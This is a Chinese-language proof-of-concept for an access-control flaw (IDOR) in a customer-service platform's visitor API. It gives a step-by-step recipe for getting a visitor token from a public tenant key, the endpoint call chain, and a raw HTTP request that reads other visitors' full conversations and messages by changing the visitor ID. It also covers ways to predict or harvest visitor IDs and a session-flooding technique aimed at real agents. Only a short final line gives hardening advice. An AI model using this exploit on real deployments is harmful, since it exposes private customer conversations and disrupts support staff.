# OCS 客服中台 访客会话越权读取（IDOR）POC

## 攻击面
访客端 API：`/api/v1/v/*`（VU）；客服端：`/api/v1/u/*`（UU，目标 ALB 层不可达）；翻译：`/api/v1/t/*`（TU）。
入口页 `https://<客服前端>/index?key=<cid>`，`key` 即租户 cid 查询参数。

## 三步口径（最容易踩的坑）
1. `POST /api/v1/v/init`，body `{"cid":"<URL 里的 key>","vid":""}` → 返回 `data.tk`（token）、`data.vid`（访客雪花 ID）、`data.cp.id`（租户数字 ID）、`data.fs`（上传后端标记）。
2. **除 init 外所有接口，body 里的 `cid` 必须是 `cp.id`（数字），不是 key**；key 只用于 init。传 key 会统一返回 `{"code":500,"msg":"操作失败"}`。
3. 鉴权头是 `x-v-token: <tk>`（放 header，不是 query）。前端 axios 拦截器会自动把 `data.tk` 存为 commonToken、把 `data.cp.id` 存为 cid，并在 query 自动追加 `cid=<cp.id>`。

## 调用链
```
init(cid=key, vid="")            → tk / vid / cp.id
  ├─ companySetting/<cp.id>      → 公司运营配置
  ├─ qn/list  {cid, }            → 快捷问题（真实话术）
  ├─ bc       {cid, vid}         → 建会话（分配真实客服，返回 conId + ats[]）
  ├─ wt/check {cid, vid}         → 排队/会话状态
  ├─ message/get {cid, vid}      → 消息列表（未建会话前返回 10005 访客不存在）
  ├─ conversation/history {cid, vid} → 历史会话（cns[]）+ 消息（mes[]）+ 分页 pg
  ├─ leave/list {cid, vid}       → 访客留言（vid 为 NotBlank）
  ├─ leave/view {cid, vid, ids[]}→ 查看留言（对非本人 ids 返回 500，有归属校验）
  ├─ message/send {cid, vid, mes}→ 发消息（字段名为 mes，需结构化对象）
  └─ GET oss/pro-sn | oss/sign?cid=<cp.id> → S3 预签名 {sn, et, ul, dir}
```

## 越权点（核心）
`conversation/history`、`message/get`、`leave/list` **只校验 token 有效性，不校验 vid 归属**。
持任意合法访客 token（可由公开 key 自行 init 获得），换 `vid` 即读该访客的会话与消息全文。

```
POST /api/v1/v/conversation/history?cid=<cp.id> HTTP/1.1
Host: <api-host>
Content-Type: application/json; charset=UTF-8
x-v-token: <tk>

{"cid":"<cp.id>","vid":"<目标访客 vid>"}
→ {"code":200,"data":{"ats":[{客服 id/昵称/头像}],"cns":[{conId, 起止时间}],"mes":[消息全文],"pg":{"hasNext":false}}}
```

**写侧**：`POST /api/v1/v/bc` body `{"cid","vid"}` 对**不存在的 vid 会新建会话并自动分配在线客服**（返回新 conId）→ 可用任意 vid 批量创建会话，对真实客服发起会话洪泛。**攻击时慎用/禁用批量调用。**

## vid 结构
`vid = (毫秒时间戳 << 22) | 序列位`（雪花 ID）。相邻两次 init 的差值 >>22 恰等于两次调用间隔毫秒数。
**可预测但稀疏**：按时间轴采样枚举（实测最近 2 小时每 2 秒 1 点、3600 次请求）命中 0 —— 除非站点有稳定流量，否则枚举不可行。
更现实的获取途径：访客 URL（前端支持 `?key=<cid>&vid=<vid>`）、客服分享的会话链接、日志/Referer 泄露。

## 加固建议
按 vid 归属校验（token↔vid 绑定）；`bc` 对未知 vid 拒绝而非新建；客服端 API 与访客端 API 分离鉴权；上传签名与桶名/目录强绑定。
